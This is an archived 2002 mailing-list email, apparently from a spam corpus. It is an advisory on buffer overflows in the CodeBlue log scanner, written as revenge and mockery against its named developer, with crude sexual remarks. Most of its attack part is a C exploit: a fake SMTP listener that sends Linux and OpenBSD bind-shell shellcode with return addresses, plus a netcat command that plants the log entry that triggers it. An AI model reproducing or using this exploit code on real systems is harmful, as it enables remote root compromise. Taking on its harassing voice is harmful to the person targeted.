@@ -1,0 +1,494 @@
+From vulnwatch-return-403-jm=jmason.org@vulnwatch.org  Wed Jul 24 17:47:46 2002
+Return-Path: <vulnwatch-return-403-yyyy=spamassassin.taint.org@vulnwatch.org>
+Delivered-To: yyyy@localhost.netnoteinc.com
+Received: from localhost (localhost [127.0.0.1])
+	by phobos.labs.netnoteinc.com (Postfix) with ESMTP id C2291440A8
+	for <jm@localhost>; Wed, 24 Jul 2002 12:47:44 -0400 (EDT)
+Received: from dogma.slashnull.org [212.17.35.15]
+	by localhost with IMAP (fetchmail-5.9.0)
+	for jm@localhost (single-drop); Wed, 24 Jul 2002 17:47:44 +0100 (IST)
+Received: from vikki.vulnwatch.org ([199.233.98.101]) by
+    dogma.slashnull.org (8.11.6/8.11.6) with SMTP id g6OGeB426692 for
+    <jm@jmason.org>; Wed, 24 Jul 2002 17:40:11 +0100
+Received: (qmail 21358 invoked by alias); 24 Jul 2002 16:58:04 -0000
+Mailing-List: contact vulnwatch-help@vulnwatch.org; run by ezmlm
+Precedence: bulk
+List-Post: <mailto:vulnwatch@vulnwatch.org>
+List-Help: <mailto:vulnwatch-help@vulnwatch.org>
+List-Unsubscribe: <mailto:vulnwatch-unsubscribe@vulnwatch.org>
+List-Subscribe: <mailto:vulnwatch-subscribe@vulnwatch.org>
+Delivered-To: mailing list vulnwatch@vulnwatch.org
+Delivered-To: moderator for vulnwatch@vulnwatch.org
+Received: (qmail 25020 invoked from network); 24 Jul 2002 16:48:34 -0000
+Date: Thu, 25 Jul 2002 02:05:00 +1000 (EST)
+From: Demi Sex God from Hell <doe@orbital.wiretapped.net>
+To: vulnwatch@vulnwatch.org
+Message-Id: <Pine.BSO.4.44.0207250203290.28334-100000@orbital.wiretapped.net>
+MIME-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII
+Subject: [VulnWatch] Remote hole in Codeblue log scanner
+
+TITLE: Potential remote root in CodeBlue log scanner
+NAME: DEMI SEX GOD FROM HELL ADV 00001
+DATE: YES, PLEASE MAIL ME IF YOU ARE FEMALE (send pictures)
+CRAZY TRACKING NUMBER THAT MAKES IT LOOK LIKE I HAVE SOME MASSIVE DATABASE OF
+JUAREZ: 7363A64B02
+
+Props to dme@#!
+
+Information
+-----------
+
+you may remember me from sweaty nights of passion, or perhaps from yesterday when
+i announced the release of a piece of software i wrote (many years ago too
+btw).
+
+in general i received no feedback from this, cept from one guy having problems
+downloading it (howd that go btw?) and then this:
+
+From: "Michael"
+To: "'Demi Sex God from Hell'"
+Subject: RE: ass the attack spoofing shell
+
+Annoying. Pointless.
+
+well! how very very rude. that really was uncalled for. (propz to dme yo!).
+gay, bi or curious, i went to find out more about mystical michael, who is
+obviously very important as he is the only one who felt the need to tell me
+they didnt like me. it turns out, hes a bit of programmer, with some code
+available on his website (www.tenebrous.com). I got codeblue, (btw mystical
+mike your auto-download script for you counter gives me a 500 error), a log
+checking utility mystical mike wrote and released under the GNU GPL to make
+the world a better place.
+
+If this tool is run as root (say nightly from roots crontab) there is a
+potential remote root. in any case, regardless of user, there is
+always a remote. if codeblue is locally suid, theres many overflows all
+throughout it, easy peasy like the girls in st patricks!!!.
+
+Note st patricks is a great place in sydney, playground of the rich and
+famous. visit it if you ever visit sydney, tell them i sent you.
+
+so lets have a walk through the code, and get a feel for mystical mike, the
+man behind the mystic. (do you wear a crazy robe with a hood like a monk
+mike?)
+
+$ cd codeblue
+$ ls
+CHANGES     COPYING     Makefile    README      codeblue.c
+$ head COPYING
+                    GNU GENERAL PUBLIC LICENSE
+                       Version 2, June 1991
+
+ Copyright (C) 1989, 1991 Free Software Foundation, Inc.
+     59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+ Everyone is permitted to copy and distribute verbatim copies
+ of this license document, but changing it is not allowed.
+
+                            Preamble
+
+/* uh-oh */
+
+$ vi codeblue.c
+/*
+ * $Header: /usr/src/Projects/codeblue/codeblue.c,v 1.1 2001/08/02 20:40:01
+ * root Exp root $
+ *
+ ******************************************************************************************
+ *                      -[ G O D  B L E S S  A M E R I C A ]-
+ *
+ ******************************************************************************************
+ *
+ *            CodeBlue v5.0 by Michael (mystic@tenebrous.com)
+ *  This software is freely distributable under the terms of the GNU/GPL.
+ *                    Please see file 'COPYING'
+
+/* god bless america, AND mystical mike! */
+
+....
+
+/* line ~273 */
+/*
+ * siginal_init:
+ * sets up all the signals we'd like
+ * to handle specially
+ */
+void signal_init(void)
+{
+    struct sigaction sa_old, sa_new;
+
+    /* signal handling */
+    sa_new.sa_handler = signal_handler;
+    sigemptyset(&sa_new.sa_mask);
+    sa_new.sa_flags = 0;
+    sigaction(SIGINT, &sa_new, &sa_old);
+    sigaction(SIGPIPE, &sa_new, &sa_old);
+}
+
+/* shared signal handler doing all sorts of stuff, not very good mike :( */
+
+/* line ~289 */
+
+/*********************************************************************
+ * Our close() wrapper
+ */
+int Close(int sd)
+{
+    return (close(sd));
+}
+
+/* that just made me laugh */
+
+/* line ~661 */
+
+char logline[512]; /* logline is global */
+
+int scan_file(FILE * fp)
+{
+    char buffer[1024];
+
+....
+
+        fgets(buffer, 1024, fp);
+
+....
+
+        if (found_infected == 1) { /* if it picks up a worm entry in the */
+				   /* log this is true */
+
+            strcpy(logline, buffer);
+
+	    /* oh dear */
+
+/* line ~827 */
+
+char reply[512]; /* global */
+char whoispath[512] = "/usr/bin/whois"; /* global */
+
+int main(int argc, char **argv)
+{
+
+ 	.....
+
+            if (argv[i][0] == '-')
+                switch (argv[i][1]) {
+                case 'e':{      /* return email address */
+                        if ((!argv[i + 1]) || (argv[i + 1][0] == '-'))
+                            DieWithRequire(argv[i]);
+                        strcpy(reply, argv[i + 1]);
+                        break;
+                    }
+                case 'p':{      /* path to whois binary */
+                        if ((!argv[i + 1]) || (argv[i + 1][0] == '-'))
+                            DieWithRequire(argv[i]);
+                        strcpy(whoispath, argv[i + 1]);
+                        break;
+                    }
+
+	/* whoops! */
+
+
+Now, all this is good for a laugh, but unless its suid, not much use :(
+
+CodeBlue will scan apache/squid logfiles looking for code red and nimda log
+hits. If it finds a hit, it will connect to the source ip adress of the hit
+and send an email warning of infection. Unfortunately, mystical mike was too
+far up on his high horse to write something decent.
+
+The function that does this is send_email() (line ~552)
+
+It starts off like this:
+
+int send_email(void)
+{
+	int sd;
+	char *host = malloc(sizeof(char) * 512);
+
+/*  .... silly crap using popen and stuff .... */
+
+	/* host is the infected host from the logfiles
+ 	 * this will connect to the host on port 25
+	 */
+
+    if ((sd = smtp_connect(host)) < SUCCESS)
+        return -1;
+
+/* Step 0 - Get initial server response */
+    get_smtp_reply(sd);
+
+/* this is the function of interest */
+
+/* line ~345 */
+/*********************************************************************
+ * fetches a reply from the SMTP server
+ */
+int get_smtp_reply(int sd)
+{
+    char response[1024]; /* this is the remote host's mail server buf */
+
+	....
+
+
+    /*
+     * We'll loop infinately, receiving
+     * 1 byte at a time until we receive a carriage return
+     * or line-feed character, signifying the end of the output
+     */
+	/* GEE! THAT SOUNDS LIKE A GOOD IDEA MYSTICAL MIKE#@!#@! */
+
+	....
+
+    while (TRUE) {
+        if (select((sd + 1), &rset, NULL, NULL, &tv) < 0) {
+            if (errno != EINPROGRESS) {
+                fprintf(stderr, "[ ERROR: select() failed: %s\n",
+                        strerror(errno));
+                return -1;
+            }
+        }
+        if (recv(sd, (int *) &response[i], 1, RECV_FL) < 0) { /* Hello */
+            if (errno == EAGAIN) {
+                if (elapsed >= smtp_timeout) {
+                    fprintf(stderr, "[ ERROR: operation timed out\n");
+                    fprintf(log, "..... ERROR: operation timed out\n");
+                    return -1;
+                }
+                elapsed++;
+                usleep(smtp_timeout * 10000);
+                continue;
+            } else {
+                if (!(flags & FL_BEQUIET))
+                    fprintf(stderr, "[ ERROR: recv() failed: %s\n",
+                            strerror(errno));
+                fprintf(log, "..... ERROR: recv() failed: %s\n",
+                        strerror(errno));
+                return -1;
+            }
+        }
+        if ((response[i] == '\n')
+            || ((response[i] == '\n') && (response[i + 1] == '\n')))
+            break;
+        i++; /* come here often baby? */
+    }
+
+So slowly but surely, response is overrun, unless it its a newline.
+
+
+/*
+ * hi, this is an exploit that doesnt work. it should be enough of a point in
+ * the right direction though. the overflow is in get_smtp_reply(), codeblue.c
+ * is pretty damn poor, there are more!!!
+ *
+ * being in a funny mood one afternoon, i made some software publicly
+ * available, the next morning i see this in my mailbox:
+ *
+ * ------- begin spouting off  ------
+ * From mystic@tenebrous.com Mon Jul 22 19:50:46 2002
+ * Return-Path:
+ * Delivered-To: doe@orbital.wiretapped.net
+ * Received: (qmail 2711 invoked from network); 22 Jul 2002 19:50:45 -0000
+ * Received: from mail110.mail.bellsouth.net (HELO imf10bis.bellsouth.net)
+ * (205.152.58.50)
+ *  by orbital.wiretapped.net with SMTP; 22 Jul 2002 19:50:45 -0000
+ * Received: from Michaels ([68.16.174.6]) by imf10bis.bellsouth.net
+ *         (InterMail vM.5.01.04.19 201-253-122-122-119-20020516) with ESMTP
+ *         id <20020722195143.XJOI21884.imf10bis.bellsouth.net@Michaels>
+ *         for ; Mon, 22 Jul 2002 15:51:43 -0400
+ * From: "Michael"
+ * To: "'Demi Sex God from Hell'"
+ * Subject: RE: ass the attack spoofing shell
+ * Date: Mon, 22 Jul 2002 15:50:13 -0400
+ * Message-ID: <000101c231b8$fedc7740$0200a8c0@Michaels>
+ * MIME-Version: 1.0
+ * Content-Type: text/plain;
+ *	charset="us-ascii"
+ * Content-Transfer-Encoding: 7bit
+ * X-Priority: 3 (Normal)
+ * X-MSMail-Priority: Normal
+ * X-Mailer: Microsoft Outlook, Build 10.0.2616
+ * Importance: Normal
+ * X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+ * In-Reply-To:
+ * Status: RO
+ *
+ * Annoying. Pointless.
+ *
+ * ------- end spouting off -------
+ *
+ * HOW RUDE!@##@!@#!
+ *
+ * so i had a visit to www.tenebrous.com, found some software written by this
+ * master coder, and here we are now.
+ *
+ * To use this against a webserver (A) using codeblue.
+ *
+ * $ printf "GET /scripts/root.exe\r\n\r\n" | nc A 80
+ *
+ * this will add an entry in the access log.
+ *
+ * ON THE SAME HOST:
+ *
+ * # ./mystic_anus 25
+ *
+ * wait a while.
+ *
+ * when codeblue runs it will pull your ip from the logs, connect to your port
+ * 25 and try to send you a mail. because mystic is an idiot, you will get a
+ * shell with the openbsd code!!!
+ *
+ * i like exclamation marks !!!!
+ *
+ * krad haxxor props: dedmunk (happy now#@!!#@) ph1ll1p, caddis, buo, solace,
+ * everyone on #cw , everyone in paris (you have a lovely city, i had a lovely
+ * time last weekend, thankyou!!!) dedmunk, everyone at netcraft (esp Mike,
+ * hi!), everyone in sydney, dedmunk, everyone i go drinking with, anyone who
+ * lives in london, marlinspike (yo!), the woman who sells me my cigarettes in
+ * the morning on the way into work, thomas greene, dedmunk, adam, durab, sh00ter.
+ *
+ * BIG SHOUT OUT TO TOLIMAN AND ZERO SUM, UNDERSTAND!!
+ *
+ * propz to dme#!@#!@
+ *
+ * dont forget:
+ *
+ * $Header: /usr/src/Projects/codeblue/codeblue.c,v 1.1 2001/08/02 20:40:01 root Exp root $
+ *
+ ******************************************************************************************
+ *                      -[ G O D  B L E S S  A M E R I C A ]-                             *
+ ******************************************************************************************
+ *
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+
+#define OF 2048 /* this is bigger than needed */
+
+/* Optimized the code, now it works better in bad situations */
+/* i dont know who wrote this, sorry, if you wrote it, let me know */
+
+char lunix_shellcode[]=
+"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
+"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
+"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
+"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
+"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
+"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
+"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
+"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";
+
+
+/*
+ shell on port 6969/tcp shellcode for OpenBSD by noir
+*/
+
+long bsd_shellcode[]=
+{
+  0x4151c931,0x51514151,0x61b0c031,0x078980cd,
+  0x4f88c931,0x0547c604,0x084f8902,0x0647c766,
+  0x106a391b,0x5004478d,0x5050078b,0x68b0c031,
+  0x016a80cd,0x5050078b,0x6ab0c031,0xc93180cd,
+  0x078b5151,0xc0315050,0x80cd1eb0,0xc9310789,
+  0x50078b51,0xb0c03150,0x4180cd5a,0x7503f983,
+  0x5b23ebef,0xc9311f89,0x89074b88,0x8d51044f,
+  0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,
+  0x01b0c031,0xd8e880cd,0x2fffffff,0x2f6e6962,
+  0x90416873
+};
+
+int main(int argc, char *argv[])
+{
+	struct 	sockaddr_in sock_in;
+	struct 	sockaddr_in sock_out;
+	char 	*port = "25";
+	int 	fd, a;
+	int 	len;
+	int		opt;
+	char bigbuf[OF];
+	char *p;
+	long lunix_resp = 0xbfffe0ac;
+	long bsd_resp = 0xdfbfc068;
+	char *moo = "220 ";
+
+	long resp = lunix_resp;
+	char *shellcode = lunix_shellcode;
+
+	printf("strlen scode = %d\n", strlen(shellcode));
+	if (argc == 2)
+		port = argv[1];
+
+	if (argc > 2) {
+		fprintf(stderr, "usege: %s [port]\n", argv[0]);
+		exit(1);
+	}
+
+	resp += 8;
+
+	p = bigbuf;
+	memcpy(p, moo, 4);
+	p += 4;
+	memset(p, '\x90', 1020 - strlen(shellcode));
+	p += 1020 - strlen(shellcode);
+	memcpy(p, shellcode, strlen(shellcode));
+	p += strlen(shellcode);
+	memcpy(p, &resp, 4);
+	p += 4;
+	memcpy(p, &resp, 4);
+	p += 4;
+	memset(p, '\n', 4);
+
+	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) < 0){
+		perror("socket");
+		exit(1);
+	}
+
+	memset(&sock_in, 0, sizeof(sock_in));
+	sock_in.sin_family = AF_INET;
+	sock_in.sin_port = htons(atoi(port));
+	sock_in.sin_addr.s_addr = INADDR_ANY;
+	len = sizeof(sock_in);
+
+	opt = 1;
+	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int)) == -1) {
+			perror("setsockopt");
+			exit(1);
+	}
+
+	if (bind(fd, (struct sockaddr *)&sock_in, len) < 0) {
+		perror("bind");
+		exit(1);
+	}
+
+	if (listen(fd, 5) < 0) {
+		perror("listen");
+		exit(1);
+	}
+
+	printf("listening on port %d\n", atoi(port));
+
+	for (;;) {
+		len = sizeof(sock_out);
+		if ((a = accept(fd, (struct sockaddr *)&sock_out, &len)) < 0){
+			perror("accept");
+			exit(1);
+		}
+		printf("got a connection from %s\n", inet_ntoa(sock_out.sin_addr));
+		fflush(stdout);
+
+		write(a, bigbuf, sizeof(bigbuf));
+		close(a);
+	}
+
+	return(1);
+
+}
+
+
